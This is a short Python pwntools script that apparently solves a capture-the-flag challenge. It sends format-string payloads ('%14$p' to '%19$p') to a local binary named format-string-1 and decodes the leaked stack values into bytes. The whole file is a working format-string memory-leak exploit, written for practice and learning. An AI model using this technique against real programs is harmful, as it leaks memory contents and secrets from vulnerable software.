from pwn import *
import re

context.log_level = 'error'

for i in range(14, 20):
    r = process('./format-string-1')
    payload = f'%{i}$p'
    r.sendline(payload)
    output = r.recvall().decode(errors='ignore')

    match = re.search(r'0x[0-9a-fA-F]+', output)
    if match:
        val = int(match.group(0), 16)
        leaked = p64(val)
        print(f'{match.group(0)} -> {leaked}')
    else:
        print('-> (null)')

    r.close()
